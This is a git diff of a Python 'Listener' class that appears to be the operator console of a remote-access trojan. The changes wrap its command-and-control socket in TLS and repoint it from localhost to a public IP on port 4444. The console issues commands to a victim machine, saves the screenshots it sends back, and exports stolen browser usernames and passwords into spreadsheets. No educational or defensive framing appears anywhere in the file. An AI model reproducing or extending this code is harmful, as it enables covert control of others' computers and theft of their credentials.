@@ -2,10 +2,18 @@ import socket,json,base64
 import time
 import pandas as pd
 import datetime
+import ssl
 
 class Listener:
     def __init__(self,ip,port):
+        self.context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+        self.context.minimum_version = ssl.TLSVersion.TLSv1_2
+        self.context.maximum_version = ssl.TLSVersion.TLSv1_3
+        self.context.load_verify_locations("server-cert.pem")
         self.connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        self.connection= self.context.wrap_socket(self.connection, server_hostname='smitk')
+        self.ip=ip
+        self.port=port
         self.connection.connect((ip,port))
         self.reliable_send("sher")
     
@@ -40,7 +48,7 @@ class Listener:
             binary_data = file.read()
             return base64.b64encode(binary_data).decode("utf-8")
     
-    def create_excel(data,type):
+    def create_excel(self,data,type):
         if type=="passwords":
             df=pd.DataFrame(data,columns=["browser_name","url",'username','password'])
             # df.to_csv('passwords.')
@@ -54,7 +62,6 @@ class Listener:
     
     def control_bakara(self):
         while True:
-            print("in loop")
             try:
                 command=input(">> ")
                 command=command.split(" ")
@@ -70,14 +77,11 @@ class Listener:
                 elif command[0]=="screenshot":
                     current_time=datetime.datetime.now().strftime("%d-%m-%Y-%H-%M-%S")
                     result=self.write_file("screenshot"+current_time+".png",result.encode())
-                elif command[0]=="browsers":
+                elif command[0]=="browser":
                     result=self.create_excel(result,command[1])
-                elif command[0]=="exit":
-                    break
             except Exception as e:
-                result="[-] Error during command execution from server side\n\n" + str(e)
+                result="[-]Sher ERR : \n" + str(e)
             print(result)
-        print("out of loop")
     
     def run(self):
         while True:
@@ -107,5 +111,6 @@ class Listener:
                 print("[-] Error during command execution from server side\n\n" + str(e))
         
 
-my_listener=Listener("localhost",4444)
+my_listener=Listener("20.235.254.229",4444)
+# my_listener=Listener("localhost",4444)
 my_listener.run()
